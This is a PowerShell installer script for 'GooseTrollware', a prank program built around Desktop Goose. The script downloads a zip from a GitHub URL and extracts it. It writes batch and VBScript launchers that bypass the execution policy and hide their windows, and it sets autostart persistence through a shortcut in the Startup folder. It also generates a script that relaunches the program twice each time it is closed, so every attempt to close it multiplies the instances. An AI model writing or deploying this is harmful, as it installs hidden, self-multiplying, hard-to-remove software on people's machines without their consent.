# Download and install
Set-Location $home
Invoke-WebRequest -Uri "https://github.com/Reginald-Gillespie/G/raw/main/g.zip" -OutFile "GooseTrollware.zip"
Expand-Archive -Path "GooseTrollware.zip" -DestinationPath "GooseTrollware" -Force

# Copy bat script to startup folder
$gloc="GooseTrollware\GooseTrollwareLegit.bat"
$batchContent = @"
@echo off
setlocal
set "psFile=%userprofile%\GooseTrollware\start.ps1"

echo Running PowerShell script...
powershell.exe -ExecutionPolicy Bypass -File "%psFile%"
echo PowerShell script run command sent.
"@
$batchContent | Out-File -FilePath $gloc -Encoding ASCII

# # Create shortcut to bat script
# # Make sure cmd is hidden
# $WshShell = New-Object -comObject WScript.Shell
# $Shortcut = $WshShell.CreateShortcut("$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.lnk")
# $Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.bat"
# $Shortcut.WindowStyle = 7
# $Shortcut.Save()

# VBScript HELL
$gloc3="GooseTrollware\GooseTrollwareLegit.vbs"
$batchContent = @"
CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
"@
$batchContent | Out-File -FilePath $gloc3 -Encoding ASCII

# Create shortcut to VBScript file
# why the hell do I have to use a vbs file to launch a bat file to launch a powershell file
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.lnk")
$Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.vbs"
$Shortcut.Arguments = "$home\GooseTrollware\GooseTrollwareLegit.bat"
$Shortcut.Save()

# Copy powershell script to goose trollware folder (should be moved inside the zip?)
$gloc2="GooseTrollware\start.ps1"
@"
`$homeDir = [Environment]::GetFolderPath("UserProfile")
`$exePath = Join-Path `$homeDir "GooseTrollware\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"

function Start-Goose {
    `$process = Start-Process -FilePath `$exePath -PassThru
    Register-ObjectEvent -InputObject `$process -EventName Exited -Action {
        Start-Goose
        Start-Goose
    }
}

Start-Goose

# Keep the script running indefinitely
while (`$true) {
    Start-Sleep -Seconds 1
}
"@ > $gloc2

# And finally we start it
Start-Sleep 1
Start-Process "$gloc" -WindowStyle Hidden
